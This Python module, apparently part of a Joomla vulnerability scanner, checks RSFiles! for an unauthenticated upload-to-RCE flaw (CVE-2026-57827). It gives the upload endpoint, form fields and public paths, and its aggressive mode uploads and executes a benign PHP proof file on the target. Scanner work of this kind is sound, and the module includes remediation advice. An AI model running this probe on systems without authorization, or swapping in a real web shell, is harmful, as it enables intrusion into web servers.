from __future__ import annotations

import urllib.parse

from ...core.evidence import generate_php_math_payload, verify_php_execution
from ...core.http import build_multipart, normalize_url, poll_paths, request
from ...core.models import Finding

CVECheckResult = Finding
from ...core.probes import rand_str
from ...core.versions import version_lt

CVE_ID = "CVE-2026-57827"
NAME = "RSFiles! unauthenticated file upload to RCE"
COMPONENT = "RSFiles!"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
AFFECTED_JOOMLA_VERSIONS = ["*"]
AFFECTED_RULE = "RSFiles! versions below 1.17.12"
FIXED_RULE = "RSFiles! 1.17.12 or later"
UPLOAD_ENDPOINT = "/index.php?option=com_rsfiles&task=rsfiles.upload"
FILE_FIELD = "file"
PUBLIC_DOWNLOAD_PATHS = [
    "/downloads/",
    "/briefcase/",
    "/components/com_rsfiles/downloads/",
    "/images/rsfiles/",
]


def affected_rsfiles(version: str | None) -> bool:
    return version_lt(version, "1.17.12")


def passive_result(plugins: dict | None) -> Finding:
    rsfiles = (plugins or {}).get("rsfiles", {})
    found = bool(rsfiles.get("found"))
    version = rsfiles.get("version")
    source = rsfiles.get("source") or "unknown"
    forbidden_only = "(403)" in source

    if not found:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_DETECTED",
            confidence="MEDIUM",
            component=COMPONENT,
            component_version=None,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail="RSFiles! was not detected via components/component/manifest routes.",
            action="Component not detected via standard public routes; verify manually if installed elsewhere.",
        )

    if not version:
        extra = (
            " Directory returned 403 (listing blocked); files may still execute."
            if forbidden_only
            else ""
        )
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="INCONCLUSIVE",
            confidence="MEDIUM",
            component=COMPONENT,
            component_version=None,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail=f"RSFiles! was detected at {source}, but its version could not be determined.{extra}",
            action=f"Manually verify RSFiles! version. Fixed version: {FIXED_RULE}.",
        )

    if affected_rsfiles(version):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="LIKELY_VULNERABLE",
            confidence="HIGH",
            component=COMPONENT,
            component_version=version,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail=f"RSFiles! {version} is below 1.17.12 and matches the affected range.",
            action=(
                f"Upgrade RSFiles! to {FIXED_RULE}, enable protected download/briefcase folders, "
                "and inspect public upload directories for unexpected PHP files."
            ),
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="PATCHED",
        confidence="HIGH",
        component=COMPONENT,
        component_version=version,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail=f"RSFiles! {version} is outside the affected range.",
        action=f"Keep RSFiles! at {FIXED_RULE} and keep public download folders protected.",
    )


def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    payload, expected_product = generate_php_math_payload()
    filename = f"jvh-rsfiles-{rand_str(8)}.php"
    content_type, body = build_multipart(
        {
            "option": "com_rsfiles",
            "task": "rsfiles.upload",
            "folder": "",
            "from": "",
            "overwrite": "1",
        },
        {FILE_FIELD: (filename, payload, "application/octet-stream")},
    )
    upload_url = f"{base}{UPLOAD_ENDPOINT}"
    upload = request(
        upload_url,
        method="POST",
        headers={"Content-Type": content_type},
        data=body,
        timeout=timeout,
        proxy=proxy,
    )
    candidate_paths = [f"{p}{urllib.parse.quote(filename)}" for p in PUBLIC_DOWNLOAD_PATHS]
    proof, found_path, attempts = poll_paths(
        lambda p: request(f"{base}{p}", timeout=timeout, proxy=proxy),
        candidate_paths,
        deadline=3.0,
        initial_delay=0.1,
        accept_fn=lambda candidate: any(
            verify_php_execution(candidate.get("body", ""), expected_product)
        ),
    )
    first_accessible_url = f"{base}{found_path}" if found_path else None

    if proof and proof.get("status") == 200 and found_path:
        proof_url = f"{base}{found_path}"
        body = proof.get("body", "")
        is_exec, is_source = verify_php_execution(body, expected_product)
        if is_exec:
            return Finding(
                cve=CVE_ID,
                name=NAME,
                status="VULNERABLE",
                confidence="CONFIRMED",
                component=COMPONENT,
                affected_rule=AFFECTED_RULE,
                exploit_available=HAS_EXPLOIT,
                exploit_ran=True,
                proof_url=proof_url,
                uploaded_filename=filename,
                detail=(
                    f"Aggressive lab upload succeeded and dynamic PHP proof ({expected_product}) executed from public RSFiles! path "
                    f"after {attempts} attempt(s). Upload response status: {upload.get('status')}."
                ),
                action=(
                    f"Delete {filename} from the RSFiles! upload/download directory, inspect for compromise, "
                    f"and upgrade RSFiles! to {FIXED_RULE}."
                ),
            )
        if is_source or "<?php" in body.lower():
            first_accessible_url = proof_url

    if first_accessible_url:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE_UPLOAD_ONLY",
            confidence="HIGH",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=first_accessible_url,
            uploaded_filename=filename,
            detail=(
                "Aggressive lab upload appears to have written the benign PHP file, but PHP did not execute "
                "from the checked public path. This still indicates unauthenticated file write exposure. "
                f"Upload status: {upload.get('status')}; verified after {attempts} attempt(s)."
            ),
            action=f"Delete {filename}, protect RSFiles! public folders, and upgrade RSFiles! to {FIXED_RULE}.",
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        uploaded_filename=filename,
        detail=(
            "Aggressive lab upload probe did not confirm execution or accessible file write. "
            f"Upload status: {upload.get('status')}; checked after {attempts} attempt(s)."
        ),
        action=f"If the file was uploaded to a custom RSFiles! directory, delete {filename}. Upgrade to {FIXED_RULE}.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    plugins: dict | None = None,
    **kwargs,
) -> Finding:
    result = passive_result(plugins)
    if not run_exploit_check:
        return result
    if exploit_mode != "aggressive":
        result.detail += " This CVE requires aggressive lab-only upload verification."
        return result
    if result.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        return result
    probe = run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
    probe.component_version = result.component_version
    return probe


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict:
    return {
        "cve": CVE_ID,
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.2.0",
        "last_reviewed": "2026-03-20",
        "updated": "2026-03-20",
        "required_detectors": ["rsfiles"],
        "references": [
            "https://www.rsjoomla.com/joomla-extensions/joomla-file-manager.html",
        ],
    }
